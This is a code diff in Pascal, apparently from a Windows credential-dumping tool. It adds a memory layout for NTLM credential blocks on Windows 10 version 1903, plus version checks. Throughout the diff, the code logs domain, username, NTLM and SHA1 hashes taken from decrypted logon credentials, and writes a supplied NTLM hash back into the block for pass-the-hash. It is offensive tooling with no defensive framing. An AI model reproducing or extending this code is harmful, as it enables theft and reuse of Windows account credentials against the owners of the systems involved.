@@ -27,6 +27,33 @@ end;
        sha1:array[0..19] of byte;
        end;
     Pcredentialkeys=^_credentialkeys;
+
+     type _CRED_NTLM_BLOCK_1903=record
+       domainlen1:word;
+       domainlen2:word;
+       unk1:dword;
+       domainoff:word;
+       unk2:array[0..5] of byte;
+       //+16
+       usernamelen1:word;
+       usernamelen2:word;
+       unk3:dword;
+       usernameoff:word;
+       unk4:array[0..5] of byte;
+       //
+       //unk5:array[0..15] of byte;
+       unk6:array[0..9+16+16] of byte;
+       //+32
+       ntlmhash:tbyte16; //array[0..15] of byte;
+       lmhash:tbyte16; //array[0..15] of byte;
+       //+64
+       sha1:array[0..19] of byte; //sha1
+       //domain
+       //username
+       end;
+    PCRED_NTLM_BLOCK_1903=^_CRED_NTLM_BLOCK_1903;
+
+
   type _CRED_NTLM_BLOCK=record
        {$ifdef CPU64}
        domainlen1:word;
@@ -750,8 +777,18 @@ begin
                                                           log('domain:'+pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).domainoff]),1);
                                                           log('username:'+pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).usernameoff]),1);
                                                           {$ifdef CPU64}
-                                                          log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash) ,1);
-                                                          log('sha1:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).sha1) ,1);
+                                                          //log(winver);
+                                                          if pos('-1903',winver)>0 then
+                                                             begin
+                                                             //log('1903');
+                                                             log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK_1903(@decrypted[0]).ntlmhash) ,1);
+                                                             log('sha1:'+ByteToHexaString(PCRED_NTLM_BLOCK_1903(@decrypted[0]).sha1) ,1);
+                                                             end
+                                                             else
+                                                             begin
+                                                             log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash) ,1);
+                                                             log('sha1:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).sha1) ,1);
+                                                             end;
                                                           {$endif CPU64}
                                                           {$ifdef CPU32}
                                                           log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).unk4) ,1);
@@ -761,7 +798,9 @@ begin
                                                           if (luid<>0) and (hash<>'') then
                                                           begin
                                                           {$ifdef CPU64}
-                                                          PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash:=HexaStringToByte(hash);
+                                                          if pos('-1903',winver)>0
+                                                             then PCRED_NTLM_BLOCK_1903(@decrypted[0]).ntlmhash:=HexaStringToByte(hash)
+                                                             else PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash:=HexaStringToByte(hash);
                                                           {$endif CPU64}
                                                           {$ifdef CPU32}
                                                           PCRED_NTLM_BLOCK(@decrypted[0]).unk4 :=HexaStringToByte(hash);
